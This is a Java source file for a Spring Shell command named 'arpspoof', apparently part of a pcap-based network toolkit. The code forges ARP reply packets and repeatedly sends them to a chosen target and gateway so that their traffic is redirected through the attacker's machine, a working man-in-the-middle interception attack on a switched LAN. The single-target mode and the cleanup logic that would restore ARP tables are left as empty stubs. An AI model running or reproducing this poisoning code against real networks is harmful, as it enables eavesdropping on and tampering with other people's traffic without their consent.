package pcap.tools.commands;

import lombok.RequiredArgsConstructor;
import org.springframework.shell.standard.ShellComponent;
import org.springframework.shell.standard.ShellMethod;
import org.springframework.shell.standard.ShellOption;
import pcap.api.PcapLive;
import pcap.api.PcapLiveOptions;
import pcap.api.Pcaps;
import pcap.codec.DataLinkLayer;
import pcap.codec.NetworkLayer;
import pcap.codec.arp.Arp;
import pcap.codec.ethernet.Ethernet;
import pcap.common.logging.Logger;
import pcap.common.logging.LoggerFactory;
import pcap.common.memory.Memories;
import pcap.common.memory.Memory;
import pcap.common.net.Inet4Address;
import pcap.common.net.MacAddress;
import pcap.spi.Interface;
import pcap.spi.Pcap;
import pcap.spi.exception.ErrorException;
import pcap.spi.exception.error.*;
import pcap.tools.commons.NetworkDiscovery;
import pcap.tools.commons.provider.ArpCleanupValueProvider;
import pcap.tools.commons.provider.InterfaceValueProvider;
import pcap.tools.commons.validator.Ip4Address;
import pcap.tools.commons.validator.Source;

import java.net.SocketException;
import java.nio.ByteBuffer;

@RequiredArgsConstructor
@ShellComponent
public class ArpSpoof {

  private static final Logger log = LoggerFactory.getLogger(ArpSpoof.class);

  private final NetworkDiscovery discovery;
  private final PcapLiveOptions options;

  @ShellMethod(key = "arpspoof", value = "Intercept packets on a switched LAN.", prefix = "")
  public void arpspoof(
      @ShellOption(
              value = "-i",
              arity = 1,
              valueProvider = InterfaceValueProvider.class,
              help = "Specify the interface to use.")
          @Source
          Interface source,
      @ShellOption(
              value = "-t",
              arity = 1,
              help =
                  "Specify a particular host to ARP poison (if not specified, all hosts on the LAN).")
          @Ip4Address
          String target,
      @ShellOption(
              value = "host",
              arity = 1,
              help =
                  "Specify the host you wish to intercept packets for (usually the local gateway).")
          @Ip4Address
          String host,
      @ShellOption(
              value = "-c",
              arity = 1,
              valueProvider = ArpCleanupValueProvider.class,
              defaultValue = "own",
              help =
                  "Specify which hardware address t use when restoring the arp configuration;"
                      + " while cleaning up, packets can be send with the own address as well"
                      + " as with the address of the host. Sending packets with a fake hw address"
                      + " can distrupt connectivity with certain switch/ap/bridge configuration,"
                      + " however it works more reliably then using own address, which is the default"
                      + " way arpspoof cleans up afterwards.")
          String ownOrHostBoth,
      @ShellOption(
              value = "-r",
              defaultValue = "false",
              help =
                  "Poison both hosts (host and target) to capture traffic in both directions."
                      + " (only valid in conjuntion with -t)")
          Boolean both) {
    try {
      final Inet4Address ownInet4Address = discovery.inet4Address(source);
      final MacAddress ownMacAddress = discovery.macAddress(source);
      final Inet4Address targetInet4Adress = Inet4Address.valueOf(target);
      final MacAddress targetMacAddres = discovery.macAddress(source, targetInet4Adress);
      final Inet4Address hostInet4Address = Inet4Address.valueOf(host);
      final MacAddress hostMacAddress = discovery.macAddress(source, hostInet4Address);

      System.out.println(ownInet4Address + " - " + ownMacAddress);
      System.out.println(targetInet4Adress + " - " + targetMacAddres);
      System.out.println(hostInet4Address + " - " + hostMacAddress);
      final Pcap pcap = Pcaps.live(new PcapLive(source, options));

      if (both) {
        Ethernet toTarget =
            buildPacket(ownInet4Address, ownMacAddress, targetInet4Adress, targetMacAddres)
                .map(
                    packets -> {
                      final Arp first = packets.getFirst(Arp.class);
                      first.builder().senderProtocolAddress(hostInet4Address).reset();
                      return (Ethernet) packets;
                    });
        Ethernet toHost =
            buildPacket(ownInet4Address, ownMacAddress, hostInet4Address, hostMacAddress)
                .map(
                    packets -> {
                      final Arp first = packets.getFirst(Arp.class);
                      first.builder().senderProtocolAddress(targetInet4Adress).reset();
                      return (Ethernet) packets;
                    });
        ByteBuffer targetBuffer = toTarget.header().buffer().nioBuffer();
        ByteBuffer hostBuffer = toHost.header().buffer().nioBuffer();

        int cnt = 10;
        while (cnt != 0) {
          cnt--;
          pcap.send(targetBuffer, targetBuffer.capacity());
          pcap.send(hostBuffer, hostBuffer.capacity());
          try {
            Thread.sleep(5000);
          } catch (InterruptedException e) {
            if (ownOrHostBoth.equals("own")) {

            } else if (ownOrHostBoth.equals("host")) {

            } else {

            }
          }
        }
      } else {

      }

    } catch (ErrorException e) {
      log.error(e);
    } catch (InterfaceNotSupportTimestampTypeException e) {
      log.error(e);
    } catch (RadioFrequencyModeNotSupportedException e) {
      log.error(e);
    } catch (ActivatedException e) {
      log.error(e);
    } catch (PermissionDeniedException e) {
      log.error(e);
    } catch (NoSuchDeviceException e) {
      log.error(e);
    } catch (PromiscuousModePermissionDeniedException e) {
      log.error(e);
    } catch (InterfaceNotUpException e) {
      log.error(e);
    } catch (TimestampPrecisionNotSupportedException e) {
      log.error(e);
    } catch (SocketException e) {
      log.error(e);
    } catch (BreakException e) {
      log.error(e);
    }
  }

  private Ethernet buildPacket(
      Inet4Address senderInet4Address,
      MacAddress senderMacAddress,
      Inet4Address targetInet4Address,
      MacAddress targetMacAddress) {
    Arp arp =
        new Arp.Builder()
            .hardwareType(DataLinkLayer.EN10MB)
            .hardwareAddressLength(MacAddress.MAC_ADDRESS_LENGTH)
            .protocolType(NetworkLayer.IPV4)
            .protocolAddressLength(Inet4Address.IPV4_ADDRESS_LENGTH)
            .operationCode(Arp.OperationCode.ARP_REPLY)
            .senderProtocolAddress(senderInet4Address)
            .senderHardwareAddress(senderMacAddress)
            .targetProtocolAddress(targetInet4Address)
            .targetHardwareAddress(targetMacAddress)
            .build();
    Ethernet ethernet =
        new Ethernet.Builder()
            .destinationMacAddress(targetMacAddress)
            .sourceMacAddress(senderMacAddress)
            .ethernetType(NetworkLayer.ARP)
            .payloadBuffer(arp.header().buffer())
            .build();
    Memory memory = Memories.assemble(ethernet.header().buffer(), ethernet.payloadBuffer());
    memory.setIndex(0, memory.capacity());
    return Ethernet.newPacket(memory);
  }

  public void sendToTarget(Inet4Address host) {}
}
